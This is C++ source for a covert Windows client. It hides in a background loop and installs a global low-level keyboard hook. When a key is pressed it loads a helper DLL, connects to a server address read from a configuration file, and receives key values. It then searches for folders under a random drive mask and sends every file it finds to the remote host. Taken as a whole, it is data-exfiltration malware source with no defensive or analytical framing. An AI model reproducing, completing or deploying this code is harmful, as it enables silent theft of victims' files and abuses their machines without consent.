#include "stdafx.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <WinSock.h>
#pragma comment(lib,"ws2_32.lib")
using namespace std;

typedef bool (*ASock) (const char*, int, int);
typedef bool (*S) (wchar_t const*, bool, bool);
typedef unsigned short US;
typedef unsigned char UC;
typedef unsigned int UI;

const UI MIN_SEC = 60;	//min in hour and seconds in min
const UI MIL_S = 1000;	//ms in second
int start; //TIME FOR START APPLICATION
const US MAX_DATA = 65514; //max segment for data in IP packet

bool kay = false;
int CALLBACK KeyboardProc(int nCode, DWORD wParam, DWORD lParam)
{
	switch(wParam)
	{
		case WM_KEYDOWN: kay = true; break;
		default: break;
	}
	return 0;
}

US Random()
{
	SYSTEMTIME t;
	GetLocalTime(&t);
	return t.wMilliseconds;
}

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	srand( Random() );
	SYSTEMTIME time;
	int Stime;	
	while(1)
	{
		GetLocalTime(&time);	
		Stime = time.wHour * MIN_SEC * MIN_SEC * MIL_S + time.wMinute * MIN_SEC * MIL_S
			+ time.wSecond * MIL_S + time.wMilliseconds;	//time in ms
	
		ifstream FileStart;
		FileStart.open(L"StartTime.txt",ios_base::in);
		US hour, min;
		if ( FileStart.is_open() )
		{
			FileStart >> hour >> min;
			if ( hour > 23 || min > 59 ) // 'cause US
			{
				hour = 10;
				min = 0;
			}
			start = hour * MIN_SEC * MIN_SEC * MIL_S + min * MIN_SEC * MIL_S;
		}
		else
		{
			start =  10 * MIN_SEC * MIN_SEC * MIL_S;
		}
		FileStart.close();

		Stime = Stime - start;	//time for start APP
		if(Stime < 0)
		{
			Stime = ~Stime + 1;
		}
//		Sleep(Stime);
	
		HHOOK temp = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)&KeyboardProc, GetModuleHandle(NULL), 0); 
		MSG * msg = new MSG;
		if(!msg)
		{
			exit(EXIT_FAILURE);
		}
	
	
		while (!::PeekMessage(msg, NULL, NULL, NULL, PM_REMOVE)) 
		{
			if(kay)
			{
				kay = false;
				HINSTANCE Dll = LoadLibrary(TEXT("Client_DLL.dll"));
	
				if (Dll)
				{
					ASock ActivateSock = (ASock)GetProcAddress(Dll,LPCSTR("?ActivateSock@@YA_NPBDHH@Z"));
					S Search = (S)GetProcAddress(Dll,LPCSTR("?Search@@YA_NPB_W_N1@Z"));
	
					wofstream *Log = (wofstream*)GetProcAddress(Dll,LPCSTR("?Log@@3V?$basic_ofstream@_WU?$char_traits@_W@std@@@std@@A"));
					SOCKET* sC = (SOCKET*)GetProcAddress(Dll,LPCSTR("?sC@@3IA"));
					WSADATA* wsadata = (WSADATA*)GetProcAddress(Dll,LPCSTR("?wsadata@@3UWSAData@@A"));
					
					US* e = (US*)GetProcAddress(Dll,LPCSTR("?e@@3GA"));
					US* n = (US*)GetProcAddress(Dll,LPCSTR("?n@@3GA"));
	
					wchar_t* folder = (wchar_t*)GetProcAddress(Dll,LPCSTR("?folder@@3PA_WA"));
					wchar_t* path = (wchar_t*)GetProcAddress(Dll,LPCSTR("?path@@3PA_WA"));
					char* buf = (char*)GetProcAddress(Dll,LPCSTR("?buf@@3PADA"));
					bool* firstFolder = (bool*)GetProcAddress(Dll,LPCSTR("?firstFolder@@3_NA"));
	
					ifstream File;
					File.open(L"Data.txt",ios_base::in);
	
					if (File.is_open())
					{
						char* iP = new char[15];
						int port;
						int delay;
	
						File >> iP;
						File >> port;
						File >> delay;
						File.close();
						Log->open(L"Logs.txt");
						
						if ( ActivateSock(iP,port,delay) )
						{
							Log->write(L"Connection activated...\n\n",25);
	
							//GET KAYS
							if ( recv(*sC,buf,MAX_DATA,0) > 0 )
							{
								union
								{
									char ch[sizeof(DWORD)];
									UI i;
								} key;
								
								memcpy(key.ch, buf, sizeof(DWORD));
								*n = (US)key.i;
								*e = (US)(key.i >> 16);

								(*Log) << "n = " << *n << " e = " << *e << "\n";

								wchar_t mask[6] = {'*','D','*','.','*','\0'};
								mask[1] = (wchar_t)rand() % 25 + 65;
								Search( wcscat(folder,mask) ,true,true); // 1st folder search
								(*Log) << "MASK : " << mask << "\n\n";
	
								*firstFolder = true;
								Search(wcscat(path,L"\\*.*"),true,false); // search and send all files from folder
			
								Sleep(50); //no close connection until server not get last file
							}
						}
						(*Log) << "End connection\n";
						Log->close();
						closesocket(*sC);
						memset(wsadata,0,sizeof(WSADATA));	
		
						delete[] iP;
					}
				}
				FreeLibrary(Dll);
				break; 
			}
			Sleep(1); //key ?
		}
		delete msg;
		UnhookWindowsHookEx(temp);
	}
		return 0;
}
		